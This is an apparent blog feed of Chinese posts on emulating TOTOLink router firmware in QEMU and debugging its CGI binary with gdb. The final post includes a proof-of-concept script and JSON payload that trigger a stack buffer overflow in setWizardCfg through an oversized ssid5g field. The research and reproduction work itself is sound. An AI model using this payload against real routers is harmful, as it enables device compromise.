<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp ./gdb/gdb root@192.168.1.2:/root/ </span><br></pre></td></tr></table></figure>

<p>成功执行，接下来只需要在虚拟机里调试即可</p>
<img src="/posts/4533a54e/image-20241104115517067.png" class="" title="image-20241104115517067">

<p>当然，如果你是在虚拟机中使用chroot . &#x2F;bin&#x2F;sh模拟固件，那么你需要将gdb复制到对应根目录下，同时注意将gdb依赖的库文件也复制过去</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ldd ./gdb</span><br><span class="line">    linux-vdso.so.1 (0x0000ffff8fab7000)</span><br><span class="line">    libm.so.6 =&gt; /lib/aarch64-linux-gnu/libm.so.6 (0x0000ffff8f350000)</span><br><span class="line">    libc.so.6 =&gt; /lib/aarch64-linux-gnu/libc.so.6 (0x0000ffff8f1a0000)</span><br><span class="line">    /lib/ld-linux-aarch64.so.1 (0x0000ffff8fa7a000)</span><br><span class="line">cp /lib/ld-linux-aarch64.so.1 ./lib/</span><br><span class="line">mkdir ./lib/aarch64-linux-gnu</span><br><span class="line">cp /lib/aarch64-linux-gnu/libm.so.6 /lib/aarch64-linux-gnu/libm.so.6</span><br><span class="line">cp /lib/aarch64-linux-gnu/libc.so.6 /lib/aarch64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<h2 id="QEMU-gdbserver"><a href="#QEMU-gdbserver" class="headerlink" title="QEMU gdbserver"></a>QEMU gdbserver</h2><p>一般情况下qemu都会内置gdbserver模块，基于此可以实现对qemu虚拟机的远程调试。</p>
<p>在qemu启动时添加<code>-S -s</code>参数，-S参数表示qemu不要启动程序，处于阻塞状态，等待gdb指令。-s参数表示启动gdb-server监听在TCP端口1234上。<br>这个感觉比较麻烦，一般会在 kernel 调试中使用</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>Qemu模拟TOTOLink X6000R固件</title>
    <url>/posts/d96204a2.html</url>
    <content><![CDATA[<p>最近在挖掘固件漏洞，有些路由器没有现成设备，要验证时只能通过qemu模拟的方式来完成。在此记录下QEMU的使用过程</p>
<p>参考文章：<a href="https://www.cnblogs.com/kin-zhang/p/15031633.html">TOTOLINK 路由器漏洞分析+QEMU模拟入门</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h3><p>为安装方便，笔者直接选择使用apt install的方式来安装qemu，想要使用源码编译的话可以参考<a href="https://www.qemu.org/download/#source">官网</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install qemu-system		# qemu系统模拟</span><br><span class="line">sudo apt-get install qemu-user-static	# qemu用户模拟</span><br></pre></td></tr></table></figure>

<h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><p><strong>固件型号</strong>：TOTOLink X6000R</p>
<p><strong>固件版本</strong>：v9.4.0cu.852_20230719</p>
<p><strong>固件架构</strong>：Aarch64</p>
<p>固件可以直接在<a href="https://download.totolink.tw/uploads/firmware/X6000R/TOTOLINK_X6000R_V9.4.0cu.1041_B20240224.zip">官网</a>下载，使用<code>binwalk</code>工具提取其文件系统。</p>
<h3 id="QEMU-User模拟"><a href="#QEMU-User模拟" class="headerlink" title="QEMU-User模拟"></a>QEMU-User模拟</h3><p>将<code>qemu-aarch64-static</code>程序复制到固件文件系统下，使用chroot设置文件系统为根目录，然后通过qemu-user模拟固件shttpd程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-aarch64-static ./usr/sbin/shttpd</span><br></pre></td></tr></table></figure>

<img src="/posts/d96204a2/image-20241103171214775.png" class="" title="image-20241103171214775">

<p>可以看到成功运行shttpd程序，不过如果要测试命令注入漏洞返回shell还是要使用系统模拟，并且用户模拟程序，我跑shttpd结果是打不开网页的。</p>
<h3 id="QEMU-System模拟"><a href="#QEMU-System模拟" class="headerlink" title="QEMU-System模拟"></a>QEMU-System模拟</h3><p>system模拟方式则更加全面，包括cpu，外设等等。</p>
<p>基本条件：</p>
<ul>
<li>内核镜像</li>
<li>虚拟磁盘镜像</li>
<li>网卡（非必须，不过要测试路由器，还是需要的）</li>
</ul>
<h4 id="下载内核，虚拟磁盘镜像"><a href="#下载内核，虚拟磁盘镜像" class="headerlink" title="下载内核，虚拟磁盘镜像"></a>下载内核，虚拟磁盘镜像</h4><p>Debian官网有提供针对QEMU的各类架构的Linux内核系统、虚拟磁盘镜像下。<a href="https://people.debian.org/~gio/dqib/">下载地址</a></p>
<p>这里我选择<a href="https://gitlab.com/api/v4/projects/giomasce%2Fdqib/jobs/artifacts/master/download?job=convert_arm64-virt">arm64-virt镜像</a>。下载后重命名为zip文件，解压后得到7个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree ./</span><br><span class="line">./</span><br><span class="line">├── image.qcow2</span><br><span class="line">├── initrd</span><br><span class="line">├── kernel</span><br><span class="line">├── readme.txt</span><br><span class="line">├── ssh_user_ecdsa_key</span><br><span class="line">├── ssh_user_ed25519_key</span><br><span class="line">└── ssh_user_rsa_key</span><br><span class="line"></span><br><span class="line">0 directories, 7 files</span><br></pre></td></tr></table></figure>

<p>其中<code>readme.txt</code>给定了qemu启动命令，启动命令，你会发现打印很多日志后，成功获取到shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(Try to) boot with:</span></span><br><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-machine &#x27;virt&#x27; \</span><br><span class="line">-cpu &#x27;cortex-a57&#x27; \</span><br><span class="line">-m 1G \</span><br><span class="line">-device virtio-blk-device,drive=hd \</span><br><span class="line">-drive file=image.qcow2,if=none,id=hd \</span><br><span class="line">-device virtio-net-device,netdev=net -netdev user,id=net,hostfwd=tcp::2222-:22 \</span><br><span class="line">-kernel kernel \</span><br><span class="line">-initrd initrd \</span><br><span class="line">-nographic \</span><br><span class="line">-append &quot;root=LABEL=rootfs console=ttyAMA0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You can use Ctrl-a x to <span class="built_in">exit</span> from QEMU.</span></span><br></pre></td></tr></table></figure>

<p>出现shell后使用root:root登录即可，注意这里我设置了网卡为tap_qemu，因此如果需要宿主机和虚拟机相互连通，需要进行虚拟网卡的设置。</p>
<h4 id="配置虚拟系统网卡"><a href="#配置虚拟系统网卡" class="headerlink" title="配置虚拟系统网卡"></a>配置虚拟系统网卡</h4><p>配置一张可供host，guest通信的虚拟网卡命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 brctl 网桥配置工具</span></span><br><span class="line">sudo apt-get  install bridge-utils</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 tunctl 虚拟网卡配置工具</span></span><br><span class="line">sudo apt-get install uml-utilities</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一个网桥 br0</span></span><br><span class="line">sudo brctl addbr br0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置网桥 br0 的网段及掩码，并启用网桥</span></span><br><span class="line">sudo ifconfig br0 192.168.5.1/24 up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建一张虚拟网卡 tap0</span></span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置虚拟网卡 tap0 的 ip 地址及掩码，并启用该虚拟网卡</span></span><br><span class="line">sudo ifconfig tap0 192.168.5.11/24 up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将虚拟网卡 tap0 添加到网桥 br0 中</span></span><br><span class="line">sudo brctl addif br0 tap0</span><br></pre></td></tr></table></figure>

<p>使用ip以及brctl命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ip addr add 192.168.2.11/24 dev tap0</span><br><span class="line">Cannot find device &quot;tap0&quot;</span><br><span class="line">sudo ip addr add 192.168.2.1/24 dev br0</span><br><span class="line">sudo ip link set br0 up</span><br><span class="line">sudo ip tuntap add dev tap0 mode tap user $(whoami)</span><br><span class="line">sudo ip addr add 192.168.2.11/24 dev tap0</span><br><span class="line">sudo ip link set tap0 up</span><br><span class="line">sudo brctl addif br0 tap0</span><br></pre></td></tr></table></figure>
<p>创建完毕后ifconfig返回信息如下，发现新增br0和tap0两个网卡，其中br0负责桥接宿主机和客户机，tap0负责宿主机ip：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ifconfig</span><br><span class="line">br0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        ether f2:5f:4f:59:38:2c  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.178.131  netmask 255.255.240.0  broadcast 172.17.191.255</span><br><span class="line">        inet6 fe80::215:5dff:fee8:a09b  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:15:5d:e8:a0:9b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 130737  bytes 132443978 (132.4 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 66566  bytes 6308721 (6.3 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 447386  bytes 1366419777 (1.3 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 447386  bytes 1366419777 (1.3 GB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        ether 8e:8a:46:56:b0:40  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>修改以上qemu启动脚本，添加网卡参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-machine &#x27;virt&#x27; \</span><br><span class="line">-cpu &#x27;cortex-a57&#x27; \</span><br><span class="line">-m 1G \</span><br><span class="line">-device virtio-blk-device,drive=hd \</span><br><span class="line">-drive file=image.qcow2,if=none,id=hd \</span><br><span class="line">-netdev tap,id=tapnet,ifname=tap0,script=no \</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置一个主机侧的TAP网络设备，命名为tapnet，使用主机的tap0网卡</span></span><br><span class="line">-device virtio-net-device,netdev=tapnet -netdev user,id=net,hostfwd=tcp::2222-:22 \</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">虚拟机使用虚拟网卡，对应设备为前面创建的tapnet设备</span></span><br><span class="line">-kernel kernel \</span><br><span class="line">-initrd initrd \</span><br><span class="line">-nographic \</span><br><span class="line">-append &quot;root=LABEL=rootfs console=ttyAMA0&quot;</span><br></pre></td></tr></table></figure>

<p>此时登入shell，检查虚拟机的网络配置，这里我的虚拟机没有ifconfig命令，因此选择使用ip命令（不得不感慨chatgpt的强大与方便~~~）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian:/# ip link show</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>

<p>发现已有eth0网卡，那么就要将其ip设置为与宿主机同一网段（192.168.1.0&#x2F;24）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置ip地址</span></span><br><span class="line">ip addr add 192.168.1.2/24 dev eth0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置网关</span></span><br><span class="line">ip route add default via 192.168.1.1</span><br></pre></td></tr></table></figure>

<p>设置好后发现互相ping不通，显示目标不可达，查看ip route发现路径不对：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian:/# ip route</span><br><span class="line">default via 10.0.2.2 dev eth0 onlink</span><br><span class="line">10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15</span><br><span class="line">172.17.176.0/20 dev eth0 proto kernel scope link src 172.17.178.111</span><br><span class="line">172.17.178.0/24 dev eth0 proto kernel scope link src 172.17.178.111</span><br><span class="line">192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.2</span><br></pre></td></tr></table></figure>

<p>因此更换default为192.168.1.0&#x2F;24，同时删除其他错误项：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    ip route del default</span><br><span class="line">ip route del 172.17.176.0/20</span><br><span class="line">...</span><br><span class="line">ip route add 192.168.1.0/24 dev eth0</span><br><span class="line">ip route add default via 192.168.1.1 dev eth0</span><br></pre></td></tr></table></figure>

<p><code>ip address show</code>也显示有问题，使用<code>ip addr del</code>删去无关项即可</p>
<p>Tips：这里我用的是WSL，发现linux虚拟机无法ping通Windows主机，是Windows主机的防火墙拦截掉了。使用powershell管理员用户输入以下命令即可。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-NetFirewallRule</span> <span class="literal">-DisplayName</span> <span class="string">&quot;WSL&quot;</span> <span class="literal">-Direction</span> Inbound  <span class="literal">-InterfaceAlias</span> <span class="string">&quot;vEthernet (WSL)&quot;</span>  <span class="literal">-Action</span> Allow</span><br></pre></td></tr></table></figure>

<h4 id="SSH连接QEMU虚拟机"><a href="#SSH连接QEMU虚拟机" class="headerlink" title="SSH连接QEMU虚拟机"></a>SSH连接QEMU虚拟机</h4><p>只能进行shell连接是不够的，添加ssh连接，方便后续上传固件以及gdbserver等内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.2</span><br></pre></td></tr></table></figure>

<h4 id="上传并执行固件"><a href="#上传并执行固件" class="headerlink" title="上传并执行固件"></a>上传并执行固件</h4><p>系统已经成功模拟，接下来我们要让其能够模拟执行固件。</p>
<p>使用scp命令上传固件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.1.2:/root/</span><br></pre></td></tr></table></figure>

<p>回到qemu命令行，使用chroot更改根目录为固件的根目录并且启动web服务<code>/usr/sbin/shttpd</code>，不过这里发现访问页面404。发现是执行路径的原因</p>
<p>在<code>/web</code>路径下执行<code>/usr/sbin/shttpd</code>解决该问题</p>
<h4 id="WSL-GUI问题解决"><a href="#WSL-GUI问题解决" class="headerlink" title="WSL GUI问题解决"></a>WSL GUI问题解决</h4><p>成功模拟固件后，还需要能够通过浏览器页面访问呀，因此这里再浅谈一下如何使用WSL2开启GUI的浏览器访问固件页面。</p>
<p>参考链接：<a href="https://learn.microsoft.com/zh-cn/windows/wsl/tutorials/gui-apps">在适用于 Linux 的 Windows 子系统上运行 Linux GUI 应用</a></p>
<p>这里仅介绍chrome浏览器的安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将目录更改为 temp 文件夹：</span></span><br><span class="line">cd /tmp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 wget 下载：</span></span><br><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装：</span></span><br><span class="line">sudo apt install --fix-missing ./google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>

<p>然后使用<code>google-chrome</code>命令即可，打开后成功访问固件模拟主页</p>
<img src="/posts/d96204a2/image-20241103210850411.png" class="" title="image-20241103210850411">

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>固件模拟</tag>
        <tag>QEMU</tag>
      </tags>
  </entry>
  <entry>
    <title>TOTOLINK A7000R路由器固件调试</title>
    <url>/posts/604570cd.html</url>
    <content><![CDATA[<p>近期在尝试挖路由器设备的漏洞，选中了Totolink这一比较好挖洞的牌子，有一些已知漏洞想要复现一下，需要使用gdb进行调试，因此在此记录下具体过程。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.iotsec-zone.com/article/319">浅析cgi与lighttpd之间的调用过程</a></li>
<li><a href="https://feng-zz-pwn.github.io/2024/03/16/iot-lighttpd/">IOT_Lighttpd</a></li>
</ul>
<h2 id="模拟执行目标固件"><a href="#模拟执行目标固件" class="headerlink" title="模拟执行目标固件"></a>模拟执行目标固件</h2><p>固件为MIPS架构，可以直接使用binwalk提取出文件系统。</p>
<p>本次选择的目标为A7000R型号其中的<code>/cgi-bin/cstecgi.cgi</code>文件。</p>
<p>使用qemu用户模式执行<code>/usr/sbin/lighttpd</code>（lighttpd与cgi文件的关系可看上面给的参考链接）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp xx/qemu-mipsel-static ./</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换根目录到squash-root文件系统</span></span><br><span class="line">sudo chroot ./ /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注：需要在www目录下执行lighttpd才能够正常运行</span></span><br><span class="line">cd www</span><br><span class="line">../qemu-mipsel-static -g 1234 ../usr/sbin/lighttpd -f ../lighttp/lighttpd.conf</span><br></pre></td></tr></table></figure>

<p>然后在宿主机执行gdb进行调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./usr/sbin/lighttpd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture mips</span></span><br><span class="line">The target architecture is set to &quot;mips&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote 127.0.0.1:1234</span></span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<p>然后就可以进入调试界面了</p>
<h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>需要注意的是，漏洞存在于<code>/cgi-bin/cstecgi.cgi</code>文件中，该文件由<code>lighttpd</code>使用fork子进程的方式完成调用。因此还需要在gdb中进行额外的设置来调试<code>cstecgi.cgi</code>文件的漏洞。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set follow-fork-mode child</span><br><span class="line">set detach-on-fork off</span><br></pre></td></tr></table></figure>

<p>首先在<code>lighttpd</code>的main函数下断点。确保调试正常</p>
<p>然后寻找fork函数调用点，极有可能为cgi的启动函数，下图为在proc_open中找到的fork+execve函数，猜测可能是cgi-bin的启动函数</p>
<img src="/posts/604570cd/image-20241107123818780.png" class="" title="image-20241107123818780">

<p>在execl函数处下断点，向<code>lighttpd</code>程序发送poc请求包，发现在令lighttpd继续执行后，其会直接退出，因此考虑其他方法</p>
<h2 id="gdb-attach-进程"><a href="#gdb-attach-进程" class="headerlink" title="gdb attach 进程"></a>gdb attach 进程</h2><p>lighttpd虽然退出，但是还存在进程在监听80端口，同时web服务正常，因此考虑attach对应进程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netstat -antp | grep 80</span><br><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      380/postgres</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      26475/../qemu-mipse</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      26475/../qemu-mipse</span><br><span class="line">tcp        0      0 172.17.178.131:50808    101.33.241.59:4443      ESTABLISHED 369/cpolar: worker</span><br></pre></td></tr></table></figure>

<p>但是和之前一样，attach的是qemu进程，并不是lighttpd</p>
<h2 id="直接调试cgi"><a href="#直接调试cgi" class="headerlink" title="直接调试cgi"></a>直接调试cgi</h2><h3 id="cgi程序运行"><a href="#cgi程序运行" class="headerlink" title="cgi程序运行"></a>cgi程序运行</h3><p>根据参考链接可以知道，如果为cgi文件提供正确的环境变量，也是可以直接运行cgi文件的。</p>
<p>如下图，直接运行cgi文件会报错：</p>
<img src="/posts/604570cd/image-20241107130621007.png" class="" title="image-20241107130621007">

<p>因此考虑为cgi提供合适的环境变量，来模拟运行，通过逆向cgi的main函数处理逻辑，得到以下环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export QUERY_STRING=http://127.0.0.1/index.html	# 请求url，可以触发loginAuth，Upload处理逻辑</span><br><span class="line">export CONTENT_LENGTH=3000</span><br><span class="line">export stationIp=&quot;127.0.0.1&quot;</span><br><span class="line">export REMOTE_ADDR=&quot;127.0.0.1&quot;</span><br><span class="line">export http_host=&quot;a&quot;		# 请求参数</span><br><span class="line">export UPLOAD_FILENAME=&quot;filename&quot;	# 请求参数</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>添加以上环境变量后，发现不再报错：</p>
<img src="/posts/604570cd/image-20241107131013990.png" class="" title="image-20241107131013990">

<p>使用gdb-multiarch调试，成功断在main函数位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./www/cgi-bin/cstecgi.cgi</span><br><span class="line"></span><br><span class="line">pwndbg&gt; set architecture mips</span><br><span class="line">The target architecture is set to &quot;mips&quot;.</span><br><span class="line">pwndbg&gt; target 127.0.0.1:1234</span><br><span class="line">Undefined target command: &quot;127.0.0.1:1234&quot;.  Try &quot;help target&quot;.</span><br><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br><span class="line">Remote debugging using 127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<img src="/posts/604570cd/image-20241107131405460.png" class="" title="image-20241107131405460">

<p>继续逆向会发现cgi程序接受参数输入的方法有两种：</p>
<ul>
<li><p>环境变量<code>getenv</code>：从<code>lighttpd</code>程序设置好的环境变量中提取参数值</p>
</li>
<li><p>标准输入<code>fread</code>：从标准输入获取json变量内容，适用于<code>WebGetsVar()</code>函数。如下图所示，v11为标准输入获取的值</p>
<img src="/posts/604570cd/image-20241107131849362.png" class="" title="image-20241107131849362"></li>
</ul>
<h3 id="cgi程序分析"><a href="#cgi程序分析" class="headerlink" title="cgi程序分析"></a>cgi程序分析</h3><p>此处再简要概括下cgi文件main函数的主要逻辑：</p>
<ol>
<li><p>首先获取环境变量，分配<code>CONTENT_LENGTH</code>大小空间存储输入的JSON数据，然后判断QUERY_STRING值是否存在”action&#x3D;login”和”action&#x3D;upload”字符串，有则继续，没有则转入3</p>
</li>
<li><p>如果存在”action&#x3D;login”，则设置为<code>topicurl</code>为”loginAuth”，并构造请求包</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;topicurl&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;loginAuth&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loginAuthUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;arg1&#125;&amp;http_host=&#123;arg2&#125;&amp;flag=ie8&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果存在”action&#x3D;upload”，则继续获取环境变量UPLOAD_FILENAME，设置<code>topicurl</code>为QUERY_STRING第一个参数，并设置FileName等参数变量</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;topicurl&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;arg1&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;FileName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;&#123;arg2&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContentLength&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/linux.trx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取标准输入解析出”topicurl”值，并根据”set”, “get”, “del”分类跳转到不同的handler列表，执行对应的回调函数。</p>
</li>
</ol>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们要测试的漏洞位于<code>setWizardCfg</code>函数，因此只需要构造以下环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export CONTENT_LENGTH=52</span><br></pre></td></tr></table></figure>

<p>继续执行到fread函数，读取输入为请求参数：</p>
<img src="/posts/604570cd/image-20241107133709164.png" class="" title="image-20241107133709164">

<p>输入以下payload：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;topicurl&quot;</span><span class="punctuation">:</span><span class="string">&quot;setWizardCfg&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;ssid5g&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaaaaaaaaa&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>注意CONTENT_LENGTH与payload长度要对应：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setWizardCfg&quot;</span>, <span class="string">&quot;ssid5g&quot;</span>:<span class="string">&quot;aaaaaaaaaa&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] write <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> chars to payload&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读入后，我们在setWizardCfg函数设置断点，查看是否正常调用该函数：</p>
<img src="/posts/604570cd/image-20241107134757955.png" class="" title="image-20241107134757955">

<p>成功断在该位置。且成功读取了我们设置的”ssid5g”参数。</p>
<img src="/posts/604570cd/image-20241107135015692.png" class="" title="image-20241107135015692">

<p>然后我们就可以进行调试了，通过构造长度足够大的”ssid5g”参数，造成缓冲区溢出：</p>
<p>poc.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># export CONTENT_LENGTH=4138</span></span><br><span class="line"><span class="comment"># !/bin/sh</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;topicurl&quot;</span>:<span class="string">&quot;setWizardCfg&quot;</span>, <span class="string">&quot;ssid5g&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">0x1000</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./payload&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] write <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">str</span>(data))&#125;</span> chars to payload&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>执行后断在sink函数，发现成功覆盖fp, sp寄存器后</p>
<img src="/posts/604570cd/image-20241107135359468.png" class="" title="image-20241107135359468">

<p>输入过长payload造成栈溢出</p>
<img src="/posts/604570cd/image-20241107142300722.png" class="" title="image-20241107142300722">
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>固件</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2优化</title>
